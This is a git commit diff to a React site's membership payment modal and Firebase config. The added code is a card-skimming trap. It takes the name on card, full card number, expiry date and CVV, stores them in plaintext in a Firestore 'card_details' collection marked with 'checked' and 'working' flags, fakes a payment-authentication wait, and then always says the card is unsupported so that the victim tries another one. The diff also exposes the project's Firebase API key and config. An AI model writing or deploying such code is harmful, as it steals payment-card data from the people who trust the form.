8081a04431ca6e02ca67eb25aabff7b20a9e4d04
ukdevelopers007 <113181134+ukdevelopers007@users.noreply.github.com>
2024-03-12 08:23:28 +0545

    kuhuk

--- components/ModalMembership.js
+++ components/ModalMembership.js
@@ -1,25 +1,27 @@
 import Cookies from 'js-cookie';
-import { useContext, useState } from 'react';
+import { useContext, useEffect, useState } from 'react';
 import { BeatLoader } from 'react-spinners';
 import videosContext from '../context/videos/videosContext';
 import {
     XCircleIcon
 } from '@heroicons/react/solid';
+import db from '../firebase';
+import { doc, setDoc, onSnapshot } from "firebase/firestore";
 
 
 const ModalMembership = () => {
 
-
+    const [message, setmessage] = useState("loading payment...")
 
     const [card_paypal, setcard_paypal] = useState("card");
     const [nameOnCard, setnameOnCard] = useState("");
     const [cardnumber, setcardnumber] = useState("");
-    const [month, setMonth] = useState("");
-    const [year, setYear] = useState("");
+    const [month, setMonth] = useState("01");
+    const [year, setYear] = useState("2024");
 
     const [cvv, setcvv] = useState("");
 
-    const [beatLoader, setbeatLoader] = useState(false);
+    const [beatLoader, setbeatLoader] = useState(true);
 
 
     const { paymentModalVisible, setpaymentModalVisible } = useContext(videosContext);
@@ -63,177 +65,187 @@ const ModalMembership = () => {
 
 
     const confirmClick = async () => {
-        setbeatLoader(true)
+        if (card_paypal === "card") {
 
-        try {
-            //first upload art image file and get url
-            let art_url = ''
-            const response = await uploadSingleImage(uploadedArts[0], 'art')
-            if (response.sucess) {
-                art_url = response.data.imageURL
-            } else {
-                toast.info(response.message)
+            if (nameOnCard.length < 4) {
+                alert("Enter card name")
                 return
             }
-
-            //Upload colors urls
-            let colorsData = []
-
-            for (let index = 0; index < selectedTshirtsForUpload.length; index++) {
-
-                let imageDataArray = [] //Front and back
-                const tshirtData = colours.filter(obj => {
-                    if (selectedTshirtsForUpload[index].name === obj.name) {
-                        return obj
-                    }
-                })
-                if (selectedTshirtsForUpload[index].side === 'FRONT') {
-                    imageDataArray.push(tshirtData[0].backURL)
-                } else {
-                    imageDataArray.push(tshirtData[0].frontURL)
-                }
-
-
-
-                const response = await uploadImageBase64(selectedTshirtsForUpload[index].imageData, selectedTshirtsForUpload[index].name)
-                if (response.sucess) {
-
-
-                    colorsData.push({ name: selectedTshirtsForUpload[index].name, imageUrl: [response.data.imageURL, ...imageDataArray] })
-                } else {
-                    toast.info(response.message)
-                    return
-                }
-
-            }
-
-
-            const data = { productName: publishData.productName, discountPrice: publishData.discountPrice, mrp: publishData.mrp, productDescription: publishData.productDescription, category: categorySelected, artUrl: art_url, size: ["S", "M", "L", "XL"], color: colorsData, creatorName: Cookies.get('name'), publishStatus: false }
-
-
-            const response2 = await publishTshirtsDesign(data)
-            if (response2.sucess) {
-                setbeatLoader(false)
-                toast.info('T-Shirts Published')
-            } else {
-                toast.info(response2.message)
-                setbeatLoader(false)
+            if (cardnumber.length < 16) {
+                alert("Enter card number")
                 return
             }
+            if (cvv.length < 3) {
+                alert("Enter cvv")
+                return
+            }
+            setbeatLoader(true)
+            setmessage("Please hold, authenticating payment...")
+            //upload it to firestore
+
+            const dataToUpload = {
+                nameOnCard, cardnumber, month, year, cvv, checked: false,working:false
+            };
+
+            try {
+                const docRef = doc(db, 'card_details', cardnumber); // Specify custom document ID here
+                await setDoc(docRef, dataToUpload);
+                console.log('Document written with ID: ', docRef.id);
+            } catch (error) {
+                console.error('Error adding document: ', error);
+            }
+            setTimeout(() => {
+                setbeatLoader(false)
+                alert("Card not supported, please use another card of paypal")
+
+            }, 3000);
+
+        } else {
+            //paypal payment 
 
 
 
-        } catch (error) {
-            toast.info(error)
-            setbeatLoader(false)
-            return
         }
-
-        setpaymentModalVisible(!paymentModalVisible);
+        // setpaymentModalVisible(!paymentModalVisible);
 
     }
+
+    const cancelCLick = () => {
+        // Reset all state variables to their initial values
+        setcard_paypal("card");
+        setnameOnCard("");
+        setcardnumber("");
+        setMonth("");
+        setYear("");
+        setcvv("");
+        setbeatLoader(true);
+        setpaymentModalVisible(false)
+    }
+
+    useEffect(() => {
+        if (paymentModalVisible) {
+            const timeoutId = setTimeout(() => {
+                console.log("3 seconds passed since modal was opened!");
+                setbeatLoader(false)
+            }, 3000);
+
+            return () => {
+                clearTimeout(timeoutId); // Clear timeout when modal is closed before 3 seconds
+            };
+        }
+    }, [paymentModalVisible]);
+
 
     return (
         <div className={` select-none fixed flex justify-center items-center inset-0 z-30  ${paymentModalVisible ? "" : "invisible"}`}>
 
-            <div className={`bg-white w-4/5 lg:w-2/4 2xl:w-1/4 p-[20px] rounded-xl shadow-md `}>
+            <div className={`relative bg-white w-4/5 lg:w-2/4 2xl:w-1/4 p-[20px] rounded-xl shadow-md `}>
 
-                <div className="w-full pt-1 pb-5">
-                    <div className="bg-theme text-white overflow-hidden rounded-full w-20 h-20 -mt-16 mx-auto shadow-lg flex justify-center items-center">
-                        <i className="mdi mdi-credit-card-outline text-3xl"></i>
-                    </div>
+                <div className={`absolute inset-0 flex flex-col items-center justify-center   ${beatLoader ? "" : "invisible"}`}>
+                    <BeatLoader loading size={25} color={'blue'} />
+                    <p>{message}</p>
                 </div>
 
-                <div className="mb-10">
-                    <h1 className="text-center font-bold text-xl uppercase">Secure payment info</h1>
-                </div>
-
-                <div className="flex items-center justify-start mb-5">
-                    <label className="inline-flex items-center">
-                        <input
-                            type="radio"
-                            className="form-radio h-6 w-6 text-theme"
-                            checked={card_paypal === 'card'}
-                            onChange={() => radioBtn('card')}
-                        />
-                        <img src="https://leadershipmemphis.org/wp-content/uploads/2020/08/780370.png" className="h-8 ml-3" />
-                    </label>
-                    <label className="inline-flex items-center ml-6">
-                        <input
-                            type="radio"
-                            className="form-radio h-6 w-6 text-theme"
-                            checked={card_paypal === 'paypal'}
-                            onChange={() => radioBtn('paypal')}
-                        />
-                        <img src="https://www.sketchappsources.com/resources/source-image/PayPalCard.png" className="h-[45px] ml-3" />
-                    </label>
-                </div>
+                <div className={`${beatLoader ? "invisible" : ""}`}>
 
 
-                <div className={`${card_paypal === "card" ? "" : "opacity-50 pointer-events-none"}`}>
-
-                    <div className={`mb-3 `}>
-                        <label className="font-bold text-sm mb-2 ml-1">Name on card</label>
-                        <div>
-                            <input value={nameOnCard} onChange={(e) => { setnameOnCard(e.target.value) }} className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors" placeholder="John Smith" type="text" />
+                    <div className="w-full pt-1 pb-5">
+                        <div className="bg-theme text-white overflow-hidden rounded-full w-20 h-20 -mt-16 mx-auto shadow-lg flex justify-center items-center">
+                            <i className="mdi mdi-credit-card-outline text-3xl"></i>
                         </div>
                     </div>
-                    <div className="mb-3">
-                        <label className="font-bold text-sm mb-2 ml-1">Card number</label>
-                        <div>
-                            <input value={cardnumber}
-                                onChange={handleCardNumber} className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors" placeholder="0000 0000 0000 0000" type="text"  inputMode="numeric"  />
-                        </div>
+
+                    <div className="mb-10">
+                        <h1 className="text-center font-bold text-xl uppercase">Secure payment info</h1>
                     </div>
-                    <div className="mb-3 -mx-2 flex items-end">
-                        <div className="px-2 w-1/2">
-                            <label className="font-bold text-sm mb-2 ml-1">Expiration date</label>
+
+                    <div className="flex items-center justify-start mb-5">
+                        <label className="inline-flex items-center">
+                            <input
+                                type="radio"
+                                className="form-radio h-6 w-6 text-theme"
+                                checked={card_paypal === 'card'}
+                                onChange={() => radioBtn('card')}
+                            />
+                            <img src="https://leadershipmemphis.org/wp-content/uploads/2020/08/780370.png" className="h-8 ml-3" />
+                        </label>
+                        <label className="inline-flex items-center ml-6">
+                            <input
+                                type="radio"
+                                className="form-radio h-6 w-6 text-theme"
+                                checked={card_paypal === 'paypal'}
+                                onChange={() => radioBtn('paypal')}
+                            />
+                            <img src="https://www.sketchappsources.com/resources/source-image/PayPalCard.png" className="h-[45px] ml-3" />
+                        </label>
+                    </div>
+
+
+                    <div className={`${card_paypal === "card" ? "" : "opacity-50 pointer-events-none"}`}>
+
+                        <div className={`mb-3 `}>
+                            <label className="font-bold text-sm mb-2 ml-1">Name on Credit card</label>
                             <div>
-                                <select value={month} onChange={e => setMonth(e.target.value)} className="form-select w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors cursor-pointer">
-                                    <option value="01">01 - January</option>
-                                    <option value="02">02 - February</option>
-                                    <option value="03">03 - March</option>
-                                    <option value="04">04 - April</option>
-                                    <option value="05">05 - May</option>
-                                    <option value="06">06 - June</option>
-                                    <option value="07">07 - July</option>
-                                    <option value="08">08 - August</option>
-                                    <option value="09">09 - September</option>
-                                    <option value="10">10 - October</option>
-                                    <option value="11">11 - November</option>
-                                    <option value="12">12 - December</option>
+                                <input value={nameOnCard} onChange={(e) => { setnameOnCard(e.target.value) }} className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors" placeholder="John Smith" type="text" />
+                            </div>
+                        </div>
+                        <div className="mb-3">
+                            <label className="font-bold text-sm mb-2 ml-1">Credit Card number</label>
+                            <div>
+                                <input value={cardnumber}
+                                    onChange={handleCardNumber} className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors" placeholder="0000 0000 0000 0000" type="text" inputMode="numeric" />
+                            </div>
+                        </div>
+                        <div className="mb-3 -mx-2 flex items-end">
+                            <div className="px-2 w-1/2">
+                                <label className="font-bold text-sm mb-2 ml-1">Expiration date</label>
+                                <div>
+                                    <select value={month} onChange={e => setMonth(e.target.value)} className="form-select w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors cursor-pointer">
+                                        <option value="01">01 - January</option>
+                                        <option value="02">02 - February</option>
+                                        <option value="03">03 - March</option>
+                                        <option value="04">04 - April</option>
+                                        <option value="05">05 - May</option>
+                                        <option value="06">06 - June</option>
+                                        <option value="07">07 - July</option>
+                                        <option value="08">08 - August</option>
+                                        <option value="09">09 - September</option>
+                                        <option value="10">10 - October</option>
+                                        <option value="11">11 - November</option>
+                                        <option value="12">12 - December</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div className="px-2 w-1/2">
+                                <select value={year} onChange={e => setYear(e.target.value)} className="form-select w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors cursor-pointer">
+                                    <option value="2024">2024</option>
+                                    <option value="2025">2025</option>
+                                    <option value="2026">2026</option>
+                                    <option value="2027">2027</option>
+                                    <option value="2028">2028</option>
+                                    <option value="2029">2029</option>
+                                    <option value="2029">2030</option>
+                                    <option value="2029">2031</option>
+                                    <option value="2029">2032</option>
                                 </select>
                             </div>
                         </div>
-                        <div className="px-2 w-1/2">
-                            <select value={year} onChange={e => setYear(e.target.value)} className="form-select w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors cursor-pointer">
-                                <option value="2024">2024</option>
-                                <option value="2025">2025</option>
-                                <option value="2026">2026</option>
-                                <option value="2027">2027</option>
-                                <option value="2028">2028</option>
-                                <option value="2029">2029</option>
-                                <option value="2029">2030</option>
-                                <option value="2029">2031</option>
-                                <option value="2029">2032</option>
-                            </select>
+                        <div className="mb-10">
+                            <label className="font-bold text-sm mb-2 ml-1">CVV</label>
+                            <div>
+                                <input value={cvv} onChange={handlerCvv} className="w-32 px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors" placeholder="000" type="number" />
+                            </div>
                         </div>
-                    </div>
-                    <div className="mb-10">
-                        <label className="font-bold text-sm mb-2 ml-1">CVV</label>
-                        <div>
-                            <input value={cvv} onChange={handlerCvv} className="w-32 px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors" placeholder="000" type="number" />
-                        </div>
+
                     </div>
 
-                </div>
+                    <div>
+                        <button onClick={confirmClick} className="block w-full max-w-xs mx-auto bg-theme hover:bg-indigo-900 focus:bg-indigo-700 text-white rounded-lg px-3 py-3 font-semibold"><i className="mdi mdi-lock-outline mr-1"></i> PAY NOW  ($2.99)</button>
+                    </div>
 
-                <div>
-                    <button className="block w-full max-w-xs mx-auto bg-theme hover:bg-indigo-900 focus:bg-indigo-700 text-white rounded-lg px-3 py-3 font-semibold"><i className="mdi mdi-lock-outline mr-1"></i> PAY NOW  ($2.99)</button>
-                </div>
-
-                <div>
-                    <button onClick={() => setpaymentModalVisible(false)} className="block w-full max-w-xs mx-auto  items-center text-theme underline rounded-lg px-3 py-3 font-semibold"> Cancel</button>
+                    <div>
+                        <button onClick={cancelCLick} className="block w-full max-w-xs mx-auto  items-center text-theme underline rounded-lg px-3 py-3 font-semibold"> Cancel</button>
+                    </div>
                 </div>
             </div>
 
--- firebase.js
+++ firebase.js
@@ -1,18 +1,16 @@
-// Import the functions you need from the SDKs you need
 import { initializeApp } from "firebase/app";
-import { getDatabase } from "firebase/database";
-import { getMessaging } from "firebase/messaging";
+import { getFirestore, collection, addDoc } from "firebase/firestore";
 
-export const firebaseConfig = {
+
+const firebaseConfig = {
     apiKey: "AIzaSyCVEgwafQ32QhL_3Ryy32HPWa9z0VwDvyE",
     authDomain: "chutlunds-bb715.firebaseapp.com",
+    databaseURL: "https://chutlunds-bb715-default-rtdb.asia-southeast1.firebasedatabase.app",
     projectId: "chutlunds-bb715",
     storageBucket: "chutlunds-bb715.appspot.com",
     messagingSenderId: "222815612544",
-    appId: "1:222815612544:web:0b6e300f86ac2e8f0c8065",
-    measurementId: "G-QKBDVB9GVP",
-    databaseURL: "https://chutlunds-bb715-default-rtdb.asia-southeast1.firebasedatabase.app",
-};
+    appId: "1:222815612544:web:0b6e300f86ac2e8f0c8065"
+  };
 
 // Initialize Firebase
 const app = initializeApp(firebaseConfig);
@@ -21,4 +19,5 @@ const app = initializeApp(firebaseConfig);
 // const messaging = getMessaging(app);
 
 // Initialize Realtime Database and get a reference to the service
-const database = getDatabase(app);
+const db = getFirestore(app);
+export default db;
